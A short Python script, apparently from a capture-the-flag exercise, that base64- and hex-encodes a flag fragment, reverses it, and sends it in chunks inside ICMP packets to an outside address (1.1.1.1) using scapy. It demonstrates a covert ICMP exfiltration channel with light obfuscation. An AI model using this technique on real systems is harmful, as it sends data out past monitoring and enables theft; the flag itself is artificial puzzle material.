# Save as icmp_exfil.py
from scapy.all import *
import base64

flag_part2 = "TR4MP_L33T}"
b64_part = base64.b64encode(flag_part2.encode()).decode()
hex_part = b64_part.encode().hex()[::-1]  # Reverse hex string
print(hex_part)

# Split hex into chunks and send ICMP packets
for chunk in [hex_part[i:i+16] for i in range(0, len(hex_part), 16)]:
    send(IP(dst="1.1.1.1")/ICMP()/Raw(load=chunk))